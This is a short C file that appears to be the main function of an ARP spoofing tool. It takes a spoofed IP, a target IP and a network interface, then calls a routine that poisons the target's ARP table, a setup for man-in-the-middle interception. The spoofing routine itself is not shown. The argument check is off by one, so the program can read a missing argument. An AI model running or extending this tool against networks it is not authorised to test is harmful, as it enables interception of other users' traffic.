
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include "arpspoof.h"

int main(int argc, char **argv)
{
    printf("\n");

    if (argc < 3)
    {
        printf("usage: ./arpspoof <spoofed-ip> <target-ip> <if>\n");
        exit(1);
    }

    t_addrs addrs;
    bzero(&addrs, sizeof(t_addrs));

    if (inet_pton(AF_INET, argv[1], &addrs.spoofed_ip) != 1)
    {
        printf("Maformed ipv4 addr: %s\n", argv[1]);
        exit(1);
    }

    if (inet_pton(AF_INET, argv[2], &addrs.dest.ip) != 1)
    {
        printf("Maformed ipv4 addr: %s\n", argv[2]);
        exit(1);
    }

    if (get_local_addrs(&addrs, argv[3]) != 0)
    {
        printf("Failed to fetch local mac address.\n");
        exit(1);
    }

    if (spoof_remote_arp_table(&addrs) != 0)
        exit(1);

    printf("Bye\n");
    return 0;
}
